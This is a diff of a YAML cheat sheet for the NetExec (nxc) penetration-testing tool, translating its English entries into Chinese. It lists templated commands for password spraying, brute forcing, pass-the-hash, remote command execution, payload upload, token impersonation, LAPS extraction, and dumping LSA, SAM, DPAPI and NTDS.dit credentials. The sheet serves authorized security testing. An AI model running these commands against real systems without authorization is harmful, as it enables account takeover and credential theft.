@@ -6,1053 +6,886 @@ actions:
   # GETTING STARTED
   # ============================================================================
   
-  - title: nxc - show help and available protocols
+  - title: nxc - 显示帮助和可用协议
     desc: |
-      Display general help and list all available protocols. Shows SMB, SSH, LDAP,
-      FTP, WMI, WinRM, RDP, VNC, MSSQL, and NFS protocols.
+      显示通用帮助并列出所有可用协议。显示 SMB、SSH、LDAP、FTP、WMI、WinRM、RDP、VNC、MSSQL 和 NFS 协议。
     command: "nxc --help"
 
-  - title: nxc - show protocol help
+  - title: nxc - 显示协议帮助
     desc: |
-      Display help for a specific protocol. Shows all available options and
-      commands for the specified protocol.
+      显示特定协议的帮助。展示指定协议的所有可用选项和命令。
     command: "nxc {{protocol|smb}} --help"
 
-  - title: nxc - set thread count
+  - title: nxc - 设置线程数
     desc: |
-      Set number of concurrent threads for scanning. Default is 100. Increase
-      for faster scanning on large networks, decrease for stealth.
+      设置扫描的并发线程数。默认为 100。在大规模网络上可增加以加快扫描，为隐蔽性可减少。
     command: "nxc {{protocol|smb}} {{target}} -u {{user}} -p {{pass}} -t {{threads|50}}"
 
-  - title: nxc - set timeout
+  - title: nxc - 设置超时
     desc: |
-      Set maximum timeout in seconds for each thread. Useful for slow networks
-      or when dealing with unresponsive hosts.
+      设置每个线程的最大超时时间（秒）。适用于慢速网络或处理无响应的主机时。
     command: "nxc {{protocol|smb}} {{target}} --timeout {{timeout|30}}"
 
-  - title: nxc - add jitter/delay
+  - title: nxc - 添加抖动/延迟
     desc: |
-      Add random delay between connections to avoid detection. Format: single value
-      or range (e.g., 2-5). Helps avoid rate limiting and detection.
+      在连接之间添加随机延迟以避免检测。格式：单个值或范围（如 2-5）。有助于避免速率限制和检测。
     command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}}"
 
-  - title: nxc - verbose output
+  - title: nxc - 详细输出
     desc: |
-      Enable verbose output for detailed information. Shows more details about
-      connections, authentication attempts, and errors.
+      启用详细输出以获取详细信息。显示更多关于连接、认证尝试和错误的细节。
     command: "nxc {{protocol|smb}} {{target}} --verbose"
 
-  - title: nxc - debug output
+  - title: nxc - 调试输出
     desc: |
-      Enable debug level output. Shows maximum detail including low-level protocol
-      information. Useful for troubleshooting.
+      启用调试级输出。显示包括底层协议信息在内的最大细节。用于排查问题。
     command: "nxc {{protocol|smb}} {{target}} --debug"
 
-  - title: nxc - disable progress bar
+  - title: nxc - 禁用进度条
     desc: |
-      Disable progress bar display. Useful when redirecting output to files or
-      when running in automated scripts.
+      禁用进度条显示。将输出重定向到文件或在自动化脚本中运行时很有用。
     command: "nxc {{protocol|smb}} {{target}} --no-progress"
 
-  - title: nxc - show version
+  - title: nxc - 显示版本
     desc: |
-      Display nxc version information. Useful for checking installed version or
-      reporting issues.
+      显示 nxc 版本信息。用于检查已安装版本或报告问题。
     command: "nxc --version"
 
   # Target Formats
-  - title: nxc - scan single hostname
+  - title: nxc - 扫描单个主机名
     desc: |
-      Scan a single hostname. nxc will resolve the hostname to IP address
-      automatically.
+      扫描单个主机名。nxc 会自动将主机名解析为 IP 地址。
     command: "nxc {{protocol|smb}} {{hostname|dc01.example.com}}"
 
-  - title: nxc - scan single IP address
+  - title: nxc - 扫描单个 IP 地址
     desc: |
-      Scan a single IP address. Most common target format for direct IP scanning.
+      扫描单个 IP 地址。直接 IP 扫描最常用的目标格式。
     command: "nxc {{protocol|smb}} {{ip|192.168.1.100}}"
 
-  - title: nxc - scan multiple IPs
+  - title: nxc - 扫描多个 IP
     desc: |
-      Scan multiple IP addresses separated by spaces. Efficient for scanning
-      a small number of specific targets.
+      扫描以空格分隔的多个 IP 地址。对扫描少量特定目标很高效。
     command: "nxc {{protocol|smb}} {{ip1|192.168.1.100}} {{ip2|192.168.1.101}}"
 
-  - title: nxc - scan CIDR range
+  - title: nxc - 扫描 CIDR 范围
     desc: |
-      Scan entire subnet using CIDR notation. Most efficient for scanning
-      entire network ranges (e.g., /24 subnet).
+      使用 CIDR 表示法扫描整个子网。扫描整个网络范围（如 /24 子网）最高效。
     command: "nxc {{protocol|smb}} {{cidr|192.168.1.0/24}}"
 
-  - title: nxc - scan IP range
+  - title: nxc - 扫描 IP 范围
     desc: |
-      Scan IP address range using dash notation. Useful for scanning specific
-      ranges without full subnet scanning.
+      使用短横线表示法扫描 IP 地址范围。用于无需扫描整个子网即可扫描特定范围。
     command: "nxc {{protocol|smb}} {{range|192.168.1.0-28}}"
 
-  - title: nxc - scan from file
+  - title: nxc - 从文件扫描
     desc: |
-      Scan targets from a file (one target per line). Supports hostnames, IPs,
-      CIDR, and ranges. Most efficient for large target lists.
+      从文件扫描目标（每行一个目标）。支持主机名、IP、CIDR 和范围。对大型目标列表最高效。
     command: "nxc {{protocol|smb}} {{targets_file|~/targets.txt}}"
 
   # Credentials
-  - title: nxc - authenticate with username and password
+  - title: nxc - 使用用户名和密码认证
     desc: |
-      Authenticate using username and password. Basic authentication method
-      supported by all protocols. Wrap passwords with special characters in quotes.
+      使用用户名和密码认证。所有协议都支持的基本认证方法。包含特殊字符的密码用引号包裹。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc - authenticate with password containing special chars
+  - title: nxc - 使用含特殊字符的密码认证
     desc: |
-      Authenticate with password containing special characters. Wrap in single
-      quotes to prevent shell interpretation issues.
+      使用包含特殊字符的密码认证。用单引号包裹以防止 shell 解释问题。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p '{{password|October2022!}}'"
 
-  - title: nxc - authenticate with NTLM hash
+  - title: nxc - 使用 NTLM 哈希认证
     desc: |
-      Authenticate using NTLM hash instead of password. Useful for pass-the-hash
-      attacks. Format: LM:NT or just NT hash.
+      使用 NTLM 哈希而非密码进行认证。适用于 pass-the-hash 攻击。格式：LM:NT 或仅 NT 哈希。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}}"
 
-  - title: nxc - authenticate with hash file
+  - title: nxc - 使用哈希文件认证
     desc: |
-      Authenticate using hashes from a file (one hash per line). Enables
-      pass-the-hash attacks against multiple targets.
+      使用文件中的哈希进行认证（每行一个哈希）。可对多个目标执行 pass-the-hash 攻击。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash_file|hashes.txt}}"
 
-  - title: nxc - authenticate with credential ID from database
+  - title: nxc - 使用数据库中的凭据 ID 认证
     desc: |
-      Use credentials from nxc database by credential ID. Automatically pulls
-      credentials from database, saves typing. Can specify multiple IDs.
+      通过凭据 ID 使用 nxc 数据库中的凭据。自动从数据库拉取凭据，节省输入。可指定多个 ID。
     command: "nxc {{protocol|smb}} {{target}} -id {{cred_id|1}}"
 
-  - title: nxc - authenticate with multiple credential IDs
+  - title: nxc - 使用多个凭据 ID 认证
     desc: |
-      Use multiple credentials from database by IDs. Tests multiple credential
-      sets from database against targets.
+      通过 ID 使用数据库中的多个凭据。对目标测试数据库中的多个凭据集。
     command: "nxc {{protocol|smb}} {{target}} -id {{id1|1}} {{id2|2}}"
 
-  - title: nxc - multi-domain authentication
+  - title: nxc - 多域认证
     desc: |
-      Authenticate in multi-domain environment. File contains usernames in
-      DOMAIN\user format, one per line.
+      在多域环境中认证。文件包含 DOMAIN 与 user 组合格式的用户名，每行一个。
     command: "nxc {{protocol|smb}} {{target}} -u {{domain_users_file}} -p {{password}}"
 
   # Password Spraying & Brute Forcing
-  - title: nxc - password spray single password
+  - title: nxc - 单密码喷洒
     desc: |
-      Password spray single password against multiple usernames. Tests one
-      password against multiple users. Watch for account lockouts!
+      对多个用户名喷洒单个密码。对多个用户测试一个密码。注意账户锁定！
     command: "nxc {{protocol|smb}} {{target}} -u {{user1|user1}} {{user2|user2}} -p {{password|Summer18}}"
 
-  - title: nxc - password spray from username file
+  - title: nxc - 从用户名文件喷洒密码
     desc: |
-      Password spray against usernames from file. One username per line. Tests
-      single password against all users in file.
+      对文件中的用户名进行密码喷洒。每行一个用户名。对文件中的所有用户测试单个密码。
     command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc - brute force single user
+  - title: nxc - 暴力破解单个用户
     desc: |
-      Brute force single username with multiple passwords. Tests multiple
-      passwords against one user. Can lock accounts!
+      用多个密码暴力破解单个用户名。对一个用户测试多个密码。可能锁定账户！
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{pass1|pass1}} {{pass2|pass2}}"
 
-  - title: nxc - brute force from password file
+  - title: nxc - 从密码文件暴力破解
     desc: |
-      Brute force username with passwords from file. One password per line.
-      Tests all passwords against single user.
+      用文件中的密码暴力破解用户名。每行一个密码。对单个用户测试所有密码。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{passwords_file|~/passwords.txt}}"
 
-  - title: nxc - brute force with user and password files
+  - title: nxc - 使用用户名和密码文件暴力破解
     desc: |
-      Brute force with both user and password files. Tests all combinations.
-      Result: user1=>pass1, user1=>pass2, user2=>pass1, etc. Very dangerous!
+      同时使用用户名和密码文件暴力破解。测试所有组合。结果：user1=>pass1、user1=>pass2、user2=>pass1 等。非常危险！
     command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}}"
 
-  - title: nxc - password spray without bruteforce
+  - title: nxc - 不暴力破解的密码喷洒
     desc: |
-      Password spray without bruteforce (1:1 mapping). Each user gets matched
-      with corresponding password from file. user1=>pass1, user2=>pass2.
+      不做暴力破解的密码喷洒（1:1 映射）。每个用户与文件中对应的密码匹配。user1=>pass1、user2=>pass2。
     command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
 
-  - title: nxc - password spray with continue on success
+  - title: nxc - 成功后继续的密码喷洒
     desc: |
-      Continue password spraying even after successful login. Useful for
-      spraying single password against large user list. Incompatible with
-      command execution.
+      成功登录后继续密码喷洒。适用于对大型用户列表喷洒单个密码。与命令执行不兼容。
     command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"
 
-  - title: nxc - check username equals password
+  - title: nxc - 检查用户名等于密码
     desc: |
-      Check if username equals password using same file. Tests if users have
-      their username as password. Uses --no-bruteforce for 1:1 mapping.
+      使用相同文件检查用户名是否等于密码。测试用户是否以用户名作为密码。使用 --no-bruteforce 进行 1:1 映射。
     command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{users_file|~/users.txt}} --no-bruteforce --continue-on-success"
 
-  - title: nxc - password spray with jitter
+  - title: nxc - 带抖动的密码喷洒
     desc: |
-      Password spray with jitter to throttle requests. Helps avoid account
-      lockouts and detection. Jitter works per-host basis.
+      带抖动地喷洒密码以限制请求速率。有助于避免账户锁定和检测。抖动按主机生效。
     command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
   # Kerberos
-  - title: nxc - authenticate with Kerberos (password)
+  - title: nxc - 使用 Kerberos 认证（密码）
     desc: |
-      Authenticate using Kerberos with password. Automatically handles TGT/ST
-      ticket requests. Requires valid domain credentials.
+      使用密码通过 Kerberos 认证。自动处理 TGT/ST 票据请求。需要有效的域凭据。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -k"
 
-  - title: nxc - authenticate with Kerberos (hash)
+  - title: nxc - 使用 Kerberos 认证（哈希）
     desc: |
-      Authenticate using Kerberos with NTLM hash. Automatically handles TGT/ST
-      ticket requests. Useful for pass-the-hash with Kerberos.
+      使用 NTLM 哈希通过 Kerberos 认证。自动处理 TGT/ST 票据请求。适用于带 Kerberos 的 pass-the-hash。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}} -k"
 
-  - title: nxc - use existing Kerberos ticket
+  - title: nxc - 使用现有 Kerberos 票据
     desc: |
-      Use existing Kerberos ticket from ccache file. Set KRB5CCNAME environment
-      variable to ticket file path. Useful when you already have valid tickets.
+      从 ccache 文件使用现有 Kerberos 票据。将 KRB5CCNAME 环境变量设置为票据文件路径。当你已有有效票据时很有用。
     command: "export KRB5CCNAME={{ticket_file|/path/to/ticket.ccache}} && nxc {{protocol|smb}} {{target}} --use-kcache"
 
-  - title: nxc - use Kerberos with kdcHost
+  - title: nxc - 使用 Kerberos 和 kdcHost
     desc: |
-      Use Kerberos with explicit KDC host. Required when domain name resolution
-      fails or when specifying custom KDC server.
+      使用显式 KDC 主机的 Kerberos。当域名解析失败或指定自定义 KDC 服务器时需要。
     command: "nxc {{protocol|ldap}} {{target}} -u {{username}} -p {{password}} -k --kdcHost {{kdc_host|dc01.example.com}}"
 
   # Modules
-  - title: nxc - list available modules
+  - title: nxc - 列出可用模块
     desc: |
-      List all available modules for a protocol. Shows module names and brief
-      descriptions. Essential for discovering module capabilities.
+      列出协议的所有可用模块。显示模块名称和简要描述。对发现模块功能至关重要。
     command: "nxc {{protocol|smb}} -L"
 
-  - title: nxc - run module
+  - title: nxc - 运行模块
     desc: |
-      Execute a module on target(s). Modules provide advanced functionality like
-      credential dumping, lateral movement, etc.
+      在目标上执行模块。模块提供凭据转储、横向移动等高级功能。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}}"
 
-  - title: nxc - show module options
+  - title: nxc - 显示模块选项
     desc: |
-      Display options for a specific module. Shows all configurable parameters
-      and their descriptions.
+      显示特定模块的选项。展示所有可配置参数及其描述。
     command: "nxc {{protocol|smb}} -M {{module_name|lsassy}} --options"
 
-  - title: nxc - run module with options
+  - title: nxc - 带选项运行模块
     desc: |
-      Execute module with custom options. Options specified in KEY=value format
-      (msfvenom style). Multiple options separated by spaces.
+      使用自定义选项执行模块。选项以 KEY=value 格式指定（msfvenom 风格）。多个选项以空格分隔。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}} -o {{option1|KEY1=value1}} {{option2|KEY2=value2}}"
 
-  - title: nxc - run multiple modules
+  - title: nxc - 运行多个模块
     desc: |
-      Execute multiple modules in sequence. Each module specified with -M flag.
-      Runs all specified modules against targets.
+      顺序执行多个模块。每个模块用 -M 标志指定。对目标运行所有指定的模块。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module1|spooler}} -M {{module2|iis}} -M {{module3|lsassy}}"
 
   # Database
-  - title: nxc - access database shell
+  - title: nxc - 访问数据库 Shell
     desc: |
-      Access nxc database shell (nxcdb). Interactive shell for querying and
-      managing stored credentials, hosts, shares, etc.
+      访问 nxc 数据库 shell（nxcdb）。用于查询和管理已存储凭据、主机、共享等的交互式 shell。
     command: "nxcdb"
 
-  - title: nxc - create workspace
+  - title: nxc - 创建工作区
     desc: |
-      Create new workspace in database. Workspaces separate different engagements
-      or pentests. All data stored per workspace.
+      在数据库中创建新工作区。工作区用于分隔不同的测试任务。所有数据按工作区存储。
     command: "nxcdb > workspace create {{workspace_name|test}}"
 
-  - title: nxc - switch workspace
+  - title: nxc - 切换工作区
     desc: |
-      Switch to different workspace. Changes active workspace for all operations.
-      All subsequent nxc commands use this workspace.
+      切换到不同的工作区。更改所有操作的活动工作区。后续所有 nxc 命令都使用此工作区。
     command: "nxcdb > workspace {{workspace_name|default}}"
 
-  - title: nxc - list workspaces
+  - title: nxc - 列出工作区
     desc: |
-      List all available workspaces. Shows all created workspaces and indicates
-      current active workspace.
+      列出所有可用工作区。显示所有已创建的工作区并指示当前活动工作区。
     command: "nxcdb > workspace list"
 
-  - title: nxc - access protocol database
+  - title: nxc - 访问协议数据库
     desc: |
-      Access specific protocol's database. Each protocol has its own database
-      with protocol-specific commands and data.
+      访问特定协议的数据库。每个协议都有自己的数据库，包含协议特定的命令和数据。
     command: "nxcdb > proto {{protocol|smb}}"
 
-  - title: nxc - export credentials from database
+  - title: nxc - 从数据库导出凭据
     desc: |
-      Export credentials from database to file. Supports simple or detailed
-      formats. Useful for sharing or backup.
+      将凭据从数据库导出到文件。支持 simple 或 detailed 格式。用于共享或备份。
     command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export creds {{format|detailed}} {{filename|creds.csv}}"
 
-  - title: nxc - export hosts from database
+  - title: nxc - 从数据库导出主机
     desc: |
-      Export hosts from database to file. Supports simple, detailed, or signing
-      formats. Signing format exports only IPs where SMB signing is enabled.
+      将主机从数据库导出到文件。支持 simple、detailed 或 signing 格式。signing 格式只导出启用了 SMB 签名的 IP。
     command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export hosts {{format|detailed}} {{filename|hosts.csv}}"
 
   # Logging
-  - title: nxc - log to file
+  - title: nxc - 记录日志到文件
     desc: |
-      Log command output to file. Logs only current command output. Useful
-      for saving results of specific scans.
+      将命令输出记录到文件。只记录当前命令的输出。用于保存特定扫描的结果。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --log {{log_file|~/nxc.log}}"
 
   # DNS Options
-  - title: nxc - set DNS server
+  - title: nxc - 设置 DNS 服务器
     desc: |
-      Manually set DNS server for name resolution. Useful when default DNS
-      doesn't resolve domain names correctly.
+      手动设置用于名称解析的 DNS 服务器。当默认 DNS 无法正确解析域名时很有用。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-server {{dns_server|8.8.8.8}}"
 
-  - title: nxc - set DNS timeout
+  - title: nxc - 设置 DNS 超时
     desc: |
-      Set DNS resolution timeout in seconds. Increase for slow DNS servers
-      or unreliable networks.
+      设置 DNS 解析超时时间（秒）。对慢速 DNS 服务器或不可靠网络可增加。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-timeout {{timeout|5}}"
 
-  - title: nxc - use TCP for DNS
+  - title: nxc - 使用 TCP 进行 DNS
     desc: |
-      Force TCP for DNS resolution instead of UDP. Useful when UDP DNS is
-      blocked or unreliable.
+      强制使用 TCP 而非 UDP 进行 DNS 解析。当 UDP DNS 被阻止或不可靠时很有用。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-tcp"
 
-  - title: nxc - enforce IPv6
+  - title: nxc - 强制使用 IPv6
     desc: |
-      Force IPv6 for connections. Use when target only has IPv6 addresses
-      or when testing IPv6 connectivity.
+      强制连接使用 IPv6。当目标只有 IPv6 地址或测试 IPv6 连通性时使用。
     command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -6"
 
   # ============================================================================
   # SMB PROTOCOL
   # ============================================================================
 
-  - title: nxc smb - basic authentication
+  - title: nxc smb - 基础认证
     desc: |
-      Authenticate to SMB share with username and password. Checks if credentials
-      are valid. Green output = success, Red = failure, Magenta = valid password
-      but authentication failed.
+      使用用户名和密码认证 SMB 共享。检查凭据是否有效。绿色输出 = 成功，红色 = 失败，洋红色 = 密码有效但认证失败。
     command: "nxc smb {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc smb - authenticate domain user
+  - title: nxc smb - 认证域用户
     desc: |
-      Authenticate using domain account. Automatically detects domain from SMB
-      connection. Shows domain\username on success.
+      使用域账户认证。自动从 SMB 连接检测域。成功后显示域和用户名。
     command: "nxc smb {{target}} -u {{domain|DOMAIN}}\\{{username}} -p {{password}}"
 
-  - title: nxc smb - authenticate local user
+  - title: nxc smb - 认证本地用户
     desc: |
-      Authenticate using local account. Use when target is not domain-joined or
-      for local account testing.
+      使用本地账户认证。当目标未加入域或测试本地账户时使用。
     command: "nxc smb {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc smb - authenticate with hash
+  - title: nxc smb - 使用哈希认证
     desc: |
-      Authenticate using NTLM hash (pass-the-hash). Format: LM:NT or just NT hash.
-      Useful when you have hashes but not plaintext passwords.
+      使用 NTLM 哈希认证（pass-the-hash）。格式：LM:NT 或仅 NT 哈希。当你有哈希但没有明文密码时很有用。
     command: "nxc smb {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"
 
-  - title: nxc smb - password spray
+  - title: nxc smb - 密码喷洒
     desc: |
-      Password spray against SMB targets. Tests single password against multiple
-      users. Watch for account lockouts! Use --continue-on-success to continue
-      after finding valid credentials.
+      对 SMB 目标进行密码喷洒。对多个用户测试单个密码。注意账户锁定！使用 --continue-on-success 可在找到有效凭据后继续。
     command: "nxc smb {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc smb - execute command
+  - title: nxc smb - 执行命令
     desc: |
-      Execute command on remote system via SMB. Requires admin privileges.
-      Shows (Pwn3d!) when code execution succeeds. Most likely local admin.
+      通过 SMB 在远程系统上执行命令。需要管理员权限。代码执行成功时显示（Pwn3d!）。很可能是本地管理员。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
 
-  - title: nxc smb - execute PowerShell command
+  - title: nxc smb - 执行 PowerShell 命令
     desc: |
-      Execute PowerShell command on remote system. Use -X flag with PowerShell
-      commands. Useful for advanced Windows administration.
+      在远程系统上执行 PowerShell 命令。使用 -X 标志和 PowerShell 命令。用于高级 Windows 管理。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -X '{{ps_command|Get-Process}}'"
 
-  - title: nxc smb - get file from remote
+  - title: nxc smb - 从远程获取文件
     desc: |
-      Download file from remote SMB share. Downloads file from remote path to
-      local path. Useful for extracting files from compromised systems.
+      从远程 SMB 共享下载文件。将文件从远程路径下载到本地路径。用于从已攻陷系统提取文件。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|\\Windows\\Temp\\file.txt}} {{local_path|/tmp/file.txt}}"
 
-  - title: nxc smb - put file to remote
+  - title: nxc smb - 上传文件到远程
     desc: |
-      Upload file to remote SMB share. Uploads local file to remote path.
-      Useful for transferring tools or payloads to compromised systems.
+      将文件上传到远程 SMB 共享。将本地文件上传到远程路径。用于向已攻陷系统传输工具或 payload。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|\\Windows\\Temp\\file.txt}}"
 
-  - title: nxc smb - enumerate shares
+  - title: nxc smb - 枚举共享
     desc: |
-      Enumerate SMB shares and access permissions. Lists all available shares
-      and shows which ones are accessible with current credentials.
+      枚举 SMB 共享和访问权限。列出所有可用共享并显示当前凭据可访问哪些。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --shares"
 
-  - title: nxc smb - spider shares
+  - title: nxc smb - 爬取共享
     desc: |
-      Recursively spider SMB shares to find files. Discovers files and folders
-      in accessible shares. Useful for finding sensitive data.
+      递归爬取 SMB 共享以查找文件。发现可访问共享中的文件和文件夹。用于查找敏感数据。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --spider {{share|C$}} --spider-folder {{folder|Users}}"
 
-  - title: nxc smb - enumerate domain users
+  - title: nxc smb - 枚举域用户
     desc: |
-      Enumerate domain users via SMB. Lists all users in the domain. Requires
-      domain credentials.
+      通过 SMB 枚举域用户。列出域中的所有用户。需要域凭据。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --users"
 
-  - title: nxc smb - enumerate domain groups
+  - title: nxc smb - 枚举域组
     desc: |
-      Enumerate domain groups via SMB. Lists all groups in the domain and their
-      members. Requires domain credentials.
+      通过 SMB 枚举域组。列出域中的所有组及其成员。需要域凭据。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --groups"
 
-  - title: nxc smb - enumerate logged on users
+  - title: nxc smb - 枚举已登录用户
     desc: |
-      Enumerate users currently logged on to target system. Shows active user
-      sessions. Useful for identifying high-value targets.
+      枚举当前登录到目标系统的用户。显示活动用户会话。用于识别高价值目标。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --loggedon-users"
 
-  - title: nxc smb - enumerate local groups
+  - title: nxc smb - 枚举本地组
     desc: |
-      Enumerate local groups on target system. Shows local group membership.
-      Useful for privilege escalation assessment.
+      枚举目标系统上的本地组。显示本地组成员。用于权限提升评估。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --local-groups"
 
-  - title: nxc smb - enumerate sessions
+  - title: nxc smb - 枚举会话
     desc: |
-      Enumerate active SMB sessions. Shows who is connected to SMB shares.
-      Useful for identifying active users.
+      枚举活动 SMB 会话。显示谁连接到 SMB 共享。用于识别活动用户。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --sessions"
 
-  - title: nxc smb - enumerate disks
+  - title: nxc smb - 枚举磁盘
     desc: |
-      Enumerate disk drives on remote system. Shows available disk volumes
-      and their sizes. Useful for reconnaissance.
+      枚举远程系统上的磁盘驱动器。显示可用磁盘卷及其大小。用于侦察。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --disks"
 
-  - title: nxc smb - check SMB signing
+  - title: nxc smb - 检查 SMB 签名
     desc: |
-      Check if SMB signing is required. Shows signing status for each host.
-      Unsigned SMB allows for relay attacks.
+      检查是否需要 SMB 签名。显示每个主机的签名状态。未签名的 SMB 允许中继攻击。
     command: "nxc smb {{target}} --gen-relay-list {{output_file|targets.txt}}"
 
-  - title: nxc smb - scan for vulnerabilities
+  - title: nxc smb - 扫描漏洞
     desc: |
-      Scan SMB targets for known vulnerabilities. Checks for common SMB
-      vulnerabilities and misconfigurations.
+      扫描 SMB 目标的已知漏洞。检查常见的 SMB 漏洞和错误配置。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --vulns"
 
-  - title: nxc smb - dump LSA secrets
+  - title: nxc smb - 转储 LSA 机密
     desc: |
-      Dump LSA secrets from remote system. Extracts cached credentials, service
-      account passwords, etc. Requires admin privileges.
+      从远程系统转储 LSA 机密。提取缓存的凭据、服务账户密码等。需要管理员权限。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M lsassy"
 
-  - title: nxc smb - dump SAM database
+  - title: nxc smb - 转储 SAM 数据库
     desc: |
-      Dump SAM database from remote system. Extracts local account password
-      hashes. Requires SYSTEM privileges.
+      从远程系统转储 SAM 数据库。提取本地账户密码哈希。需要 SYSTEM 权限。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M sam"
 
-  - title: nxc smb - dump DPAPI secrets
+  - title: nxc smb - 转储 DPAPI 机密
     desc: |
-      Dump DPAPI secrets from remote system. Extracts encrypted credentials
-      stored by Windows applications. Requires user context.
+      从远程系统转储 DPAPI 机密。提取 Windows 应用存储的加密凭据。需要用户上下文。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M dpapi"
 
-  - title: nxc smb - dump NTDS.dit
+  - title: nxc smb - 转储 NTDS.dit
     desc: |
-      Dump NTDS.dit from domain controller. Extracts all domain account hashes.
-      Requires Domain Admin privileges and access to DC.
+      从域控转储 NTDS.dit。提取所有域账户哈希。需要域管理员权限和访问域控。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M ntds"
 
-  - title: nxc smb - check for null sessions
+  - title: nxc smb - 检查空会话
     desc: |
-      Check for null session access. Tests if anonymous/null sessions are
-      allowed. Useful for enumeration without credentials.
+      检查空会话访问。测试是否允许匿名/空会话。用于无凭据枚举。
     command: "nxc smb {{target}} -u '' -p ''"
 
-  - title: nxc smb - generate hosts file
+  - title: nxc smb - 生成 hosts 文件
     desc: |
-      Generate hosts file from discovered systems. Creates /etc/hosts format
-      file with hostname to IP mappings.
+      从发现的系统生成 hosts 文件。创建主机名到 IP 映射的 /etc/hosts 格式文件。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-hosts-file {{output_file|hosts.txt}}"
 
-  - title: nxc smb - generate krb5.conf
+  - title: nxc smb - 生成 krb5.conf
     desc: |
-      Generate krb5.conf file for Kerberos. Creates Kerberos configuration
-      file with domain information.
+      为 Kerberos 生成 krb5.conf 文件。创建包含域信息的 Kerberos 配置文件。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-krb5-conf {{output_file|krb5.conf}}"
 
-  - title: nxc smb - generate TGT
+  - title: nxc smb - 生成 TGT
     desc: |
-      Generate Kerberos TGT ticket. Requests TGT from KDC and saves to ccache
-      file. Requires valid domain credentials.
+      生成 Kerberos TGT 票据。从 KDC 请求 TGT 并保存到 ccache 文件。需要有效的域凭据。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-tgt {{output_file|ticket.ccache}}"
 
-  - title: nxc smb - change user password
+  - title: nxc smb - 更改用户密码
     desc: |
-      Change user password on remote system. Requires appropriate privileges
-      to change the target user's password.
+      在远程系统上更改用户密码。需要适当的权限来更改目标用户的密码。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} --change-password {{target_user}} {{new_password}}"
 
-  - title: nxc smb - impersonate logged on users
+  - title: nxc smb - 冒充已登录用户
     desc: |
-      Impersonate users currently logged on. Steals tokens from logged on
-      users for privilege escalation.
+      冒充当前已登录的用户。从已登录用户窃取令牌以提升权限。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M impersonate"
 
-  - title: nxc smb - check for Print Spooler
+  - title: nxc smb - 检查 Print Spooler
     desc: |
-      Check if Print Spooler service is running. Print Spooler can be abused
-      for privilege escalation (CVE-2021-1675).
+      检查 Print Spooler 服务是否在运行。Print Spooler 可被滥用于权限提升（CVE-2021-1675）。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M spooler"
 
-  - title: nxc smb - check for WebDAV
+  - title: nxc smb - 检查 WebDAV
     desc: |
-      Check if WebDAV is running and accessible. WebDAV can be used for file
-      operations and potential exploitation.
+      检查 WebDAV 是否运行且可访问。WebDAV 可用于文件操作和潜在利用。
     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M webdav"
 
-  - title: nxc smb - defeat LAPS
+  - title: nxc smb - 突破 LAPS
     desc: |
-      Extract LAPS (Local Administrator Password Solution) passwords. Retrieves
-      managed local admin passwords from domain.
+      提取 LAPS（本地管理员密码解决方案）密码。从域中获取托管的本地管理员密码。
